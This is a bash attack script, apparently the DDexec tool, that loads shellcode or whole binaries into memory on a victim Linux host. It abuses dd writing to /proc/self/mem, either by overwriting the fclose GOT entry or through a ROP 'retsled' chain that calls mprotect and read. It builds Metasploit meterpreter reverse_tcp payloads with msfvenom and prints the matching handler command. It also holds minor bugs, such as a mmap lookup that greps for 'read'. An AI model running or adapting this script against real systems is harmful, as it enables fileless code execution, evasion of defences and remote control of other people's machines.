#!/bin/bash


#############################
##### INITIAL VARIABLES #####
#############################
WRITE_TO_ADDR=$((0x7fffffffe000))
BASE_ADDR=0000555555554000 # Base to load the binary

DD_PATH=""
LIBC_PATH="" #LIBC_PATH=$(ldd $DD_PATH | grep libc | cut -d' ' -f3)
LPORT=""
LHOST=""
PAYLOAD="linux/x64/meterpreter/reverse_tcp"
ARCH="" #uname -m
MODE="fclose_got"
# Shellcode to inject, "echo Pwnd!", for testing
SHELLCODE="4831c0b0024889c7b0014889c6b0210f054831c04889c6b0024889c7b0210f054831c048ffc04889c7488d35110000004831d2b2060f054831c0b03c4831ff0f0550776e64210a"
BIN_PATH=""

read -r -d '' HELP <<- EOM
    Use this program to execute shellcodes and binaries in memory.
    Arguments:
      -h Print this help
      -d Path to the victim dd binary (you should download it from the victim). Find it with 'command -v dd' Required.
      -l Path to the victim libc (you should download it from the victim). Find it with 'ldd `command -v dd` | grep libc | cut -d' ' -f3'. Required with mode "retsled".
      -H LHOST to receive the meterpreter
      -P LPORT to receive the meterpreter.
      -p Metasploit payload (by default linux/x64/meterpreter/reverse_tcp)
      -a Architecture of the victim system. Get it with 'uname -m'. Required.
      -m Mode of memory load. By default fclose_got if dd binary not protected with full relro, if protected, retsled is forced.
      -s Shellcode to execute in hex "4831c0b002...". If msfvenom params are given, msfvenom will create a shellcode. By default a shellcode that echoes "Pwnd!" is used.
      -b Binary to load in memory. It has to be either statically linked or use the same dynamic libs as on a target machine.
    
    e.g.: DDexec.sh -d /path/to/dd [-l /path/to/libc] -P 4444 -H 10.10.10.10 -a x86_64 [-m <fclose_got,retsled> (default fclose_got)] [-s <shellcode_hex>]
EOM


while getopts "hd:l:H:P:a:m:p:s:b:" opt; do
  case "$opt" in
    h|\?) echo "$HELP"; exit 0;;
    d)  DD_PATH=$OPTARG;;
    l)  LIBC_PATH=$OPTARG;;
    P)  LPORT=$OPTARG;;
    H)  LHOST=$OPTARG;;
    a)  ARCH=$OPTARG;;
    m)  MODE=$OPTARG;;
    p)  PAYLOAD=$OPTARG;;
    s)  SHELLCODE=$OPTARG;;
    b)  BIN_PATH=$OPTARG;;
  esac
done

if ! [ "$DD_PATH" ]; then
    >&2 echo "Set the path to the dd binary downloaded from the victim system"
    >&2 echo "$HELP"
    exit 1
fi
if [ "$LHOST" ] && ! [ "$LPORT" ]; then
    >&2 echo "Set the LPORT"
    >&2 echo "$HELP"
    exit 1
fi
if [ "$LPORT" ] && ! [ "$LHOST" ]; then
    >&2 echo "Set the LHOST"
    >&2 echo "$HELP"
    exit 1
fi
if ! [ "$ARCH" ]; then
    >&2 echo "Set the ARCH (uname -m in the victim system)"
    >&2 echo "$HELP"
    exit 1
fi
if [ "$MODE" != "fclose_got" ] && [ "$MODE" != "retsled" ]; then
    >&2 echo "Set the MODE of the memory load, valid values are: 'fclose_got' and 'retsled'"
    >&2 echo "$HELP"
    exit 1
fi

if [ "$(readelf -d $DD_PATH | grep 'BIND_NOW')" ] && [ "$MODE" = "fclose_got" ]; then
    >&2 echo "DD binary has full relro, MODE must be retsled. Setting it."
    MODE="retsled"
fi

if ! [ "$LIBC_PATH" ] && [ "$MODE" = "retsled" ]; then
    >&2 echo "Set the path to the libc library downloaded from the victim system (this is needed with RETSLED mode)"
    >&2 echo "$HELP"
    exit 1
fi

if ! [ "$(command -v objdump)" ]; then
    >&2 echo "Install objdump"
    exit 1
fi

if ! [ "$(command -v readelf)" ]; then
    >&2 echo "Install readelf"
    exit 1
fi

if ! [ "$(command -v ROPgadget)" ]; then
    >&2 echo "Install ROPgadget and put it in PATH"
    exit 1
fi


if [ "$LHOST" ] && [ "$LPORT" ] && [ "$PAYLOAD" ]; then
    >&2 echo "msfconsole -q -x 'use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; run'"
    SHELLCODE=$(msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f hex 2>/dev/null)
fi

if [ "$BIN_PATH" ]; then
    SHELLCODE="4831c04831ff66bf0a00b8200000000f054831c048ffc7b8200000000f0568414141414889e7be00000000b83f0100000f05b8220000000f054831c04883c03c4831ff0f05"
    >&2 echo "echo '$(base64 -w0 $BIN_PATH)' | base64 -d > /proc/\$(pidof dd)/fd/0" 
fi

SHELLCODE_LENGTH=$(echo -n $SHELLCODE | wc -c)
SHELLCODE_LENGTH=$(($SHELLCODE_LENGTH / 2))
SHELLCODE_LENGTH_16=$(printf "%016x" $SHELLCODE_LENGTH)



#############################
######## FUNCTIONS ##########
#############################

to_little_endian()
{
    # Convert given hex value to little endian
    local result=""
    result=$(echo $1 | cut -c 15-16)
    result=${result}$(echo $1 | cut -c 13-14)
    result=${result}$(echo $1 | cut -c 11-12)
    result=${result}$(echo $1 | cut -c 9-10)
    result=${result}$(echo $1 | cut -c 7-8)
    result=${result}$(echo $1 | cut -c 5-6)
    result=${result}$(echo $1 | cut -c 3-4)
    result=${result}$(echo $1 | cut -c 1-2)
    echo -n "$result"
}

get_libc_base (){
    # Find where is located the libc without ASLR in this system
    cat_maps=$(setarch $ARCH -R cat /proc/self/maps)
    LIBC_BASE=$(echo "$cat_maps" | grep libc | head -n1 | cut -d'-' -f1)
    LIBC_BASE=$((0x$LIBC_BASE))
    >&2 echo "Libc base       = 0x0000$LIBC_BASE"
}


get_mprotect_addr (){
    # Find the addr of mprotect inside libc
    mprotect_offset=$(objdump -T $LIBC_PATH | grep -w mprotect | cut -d' ' -f1)
    mprotect_offset=$((0x$mprotect_offset))
    MPROTECT_ADDR=$(($mprotect_offset+$LIBC_BASE))
    MPROTECT_ADDR=$(printf "%016x" $MPROTECT_ADDR)
    >&2 echo "&mprotect()     = 0x"$MPROTECT_ADDR
}

get_read_addr (){
    # Find the addr of read inside libc
    read_offset=$(objdump -T $LIBC_PATH | grep -w read | cut -d' ' -f1)
    read_offset=$((0x$read_offset))
    READ_ADDR=$(($read_offset+$LIBC_BASE))
    READ_ADDR=$(printf "%016x" $READ_ADDR)
    >&2 echo "&read()         = 0x"$READ_ADDR
}

get_mmap_addr (){
    # Find the addr of read inside libc
    mmap_offset=$(objdump -T $LIBC_PATH | grep -w read | cut -d' ' -f1)
    mmap_offset=$((0x$mmap_offset))
    MMAP_ADDR=$(($read_offset+$LIBC_BASE))
    MMAP_ADDR=$(printf "%016x" $MMAP_ADDR)
    >&2 echo "&mmap()         = 0x"$MMAP_ADDR
}

get_pop_rdi (){
    POP_RDI=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 | \
                grep ": pop rdi ; ret" | cut -d' ' -f1)
    POP_RDI=$(echo $POP_RDI | cut -c 3-18)
    >&2 echo "POP RDI; RET; in $POP_RDI"
}

get_pop_rsi (){
    POP_RSI=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 | \
            grep ": pop rsi ; ret" | cut -d' ' -f1)
    POP_RSI=$(echo $POP_RSI | cut -c 3-18)
    >&2 echo "POP RDI; RET; in $POP_RSI"
}

get_pop_rdx (){
    POP_RDX=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 | \
            grep ": pop rdx ; ret" | cut -d' ' -f1)
    POP_RDX=$(echo $POP_RDX | cut -c 3-18)
    >&2 echo "POP RDI; RET; in $POP_RDX"
}

get_ret (){
    RET=$(ROPgadget --binary $DD_PATH --offset 0x0000555555554000 --only ret | \
        grep ret | grep -v ";" | cut -d' ' -f1)
    RET=$(echo $RET | cut -c 3-18)
    >&2 echo "RET; in $RET"
}



#############################
######## fclose_got #########
#############################
if [ "$MODE" = "fclose_got" ]; then
    SHELLCODE=$(echo -n $SHELLCODE | sed 's/.\{2\}/\\x&/g')
    JMP_ADDR=$(objdump -Mintel -d $DD_PATH | grep fclose | grep jmp | awk '{print $1}' | cut -d ':' -f1)
    echo " echo -n -e \"$SHELLCODE\" | setarch $ARCH -R dd of=/proc/self/mem bs=1 seek=$((0x555555554000 + 0x$JMP_ADDR )) conv=notrunc &"
fi


#############################
######### RETSLED ###########
#############################
if [ "$MODE" = "retsled" ]; then
    get_libc_base
    get_mprotect_addr
    get_read_addr
    get_pop_rdi
    get_pop_rsi
    get_pop_rdx
    get_ret


    #############################
    ####### GENERATE ROP ########
    #############################

    # retsled to capture the execution
    RETSLED=""
    for i in {0..400}
    do
        RETSLED=${RETSLED}$(to_little_endian $RET)
    done

    # Give W permissions to a ell known address
    ROP=${RETSLED}$(to_little_endian $POP_RDI)
    ROP=${ROP}$(to_little_endian $BASE_ADDR)
    ROP=${ROP}$(to_little_endian $POP_RSI)
    ROP=${ROP}$(to_little_endian $SHELLCODE_LENGTH_16)
    ROP=${ROP}$(to_little_endian $POP_RDX)
    ROP=${ROP}$(to_little_endian "0000000000000002") 
    ROP=${ROP}$(to_little_endian $MPROTECT_ADDR)

    # Read from STDIN the initial shellcode
    ROP=${ROP}$(to_little_endian $POP_RDI)
    ROP=${ROP}"0000000000000000"
    ROP=${ROP}$(to_little_endian $POP_RSI)
    ROP=${ROP}$(to_little_endian $BASE_ADDR)
    ROP=${ROP}$(to_little_endian $POP_RDX)
    ROP=${ROP}$(to_little_endian $SHELLCODE_LENGTH_16)
    ROP=${ROP}$(to_little_endian $READ_ADDR)

    # Give Exec permissions and remove the write permissions from the shellcode
    ROP=${ROP}$(to_little_endian $POP_RDI)
    ROP=${ROP}$(to_little_endian $BASE_ADDR)
    ROP=${ROP}$(to_little_endian $POP_RSI)
    ROP=${ROP}$(to_little_endian $SHELLCODE_LENGTH_16)
    ROP=${ROP}$(to_little_endian $POP_RDX)
    ROP=${ROP}$(to_little_endian "0000000000000004")
    ROP=${ROP}$(to_little_endian $MPROTECT_ADDR)

    # Execute the shellcode
    ROP=${ROP}$(to_little_endian $BASE_ADDR)

    ROP_len=$(echo -n $ROP | wc -c)
    ROP_len=$(($ROP_len / 2))


    #############################
    ######### INJECTION #########
    #############################

    echo " (echo -n $ROP ; echo -n $SHELLCODE) | \
    sed 's/\([0-9A-F]\{2\}\)/\\\\\\\\\\\\x\1/gI' | xargs printf | \
    setarch $ARCH -R env -i \$(command -v dd) bs=$ROP_len of=/proc/self/mem \
    seek=$WRITE_TO_ADDR conv=nocreat,notrunc oflag=seek_bytes count=1 &"
fi